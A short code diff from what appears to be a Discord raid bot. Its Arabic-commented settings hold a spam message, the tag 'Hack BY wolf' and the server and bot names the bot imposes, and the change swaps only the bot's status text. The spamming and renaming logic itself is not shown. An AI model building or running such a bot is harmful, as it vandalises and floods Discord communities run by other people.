@@ -8,7 +8,7 @@ const vooice = "Hack BY wolf" //هنا تحط وش تبي يكون اسم الر
 const pic = "https://cdn.discordapp.com/avatars/200644160179535872/5a245f045a43665f00f6b1a7817cc68c.png?size=2048" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
 const spam = "Hack BY wolf" //هنا تحط وش تبي رسالة السبام
 const namee = "B7BK" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
-const playing = "Hacked u hhh Malicious" //هنا تحط وش تبي يكون الستريمنق
+const playing = "كيفك؟" //هنا تحط وش تبي يكون الستريمنق
 client.on('message', message => {
 if (message.content === x_x) {
     var teeext = teext.replace(" ", "-")
